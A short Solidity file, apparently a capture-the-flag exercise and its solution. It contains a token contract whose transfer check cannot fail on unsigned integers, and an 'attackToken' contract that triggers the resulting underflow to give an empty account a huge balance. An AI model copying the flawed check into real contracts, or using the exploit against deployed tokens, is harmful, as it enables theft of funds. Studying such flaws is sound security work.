// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {
    mapping(address => uint256) balances;
    uint256 public totalSupply;

    constructor(uint256 _initialSupply) public {
        balances[msg.sender] = totalSupply = _initialSupply;
    }

    function transfer(address _to, uint256 _value) public returns (bool) {
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
    }

    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }
}

contract attackToken{


function attack(address _tokenAddress,uint256 _amount) public {
//this will not revert even thou our balance is 0 because they are using sol old version
// instead of reverting it will endup giving us a big balnce to withdraw from
    Token(_tokenAddress).transfer(0x0000000000000000000000000000000000000001,_amount);
}

}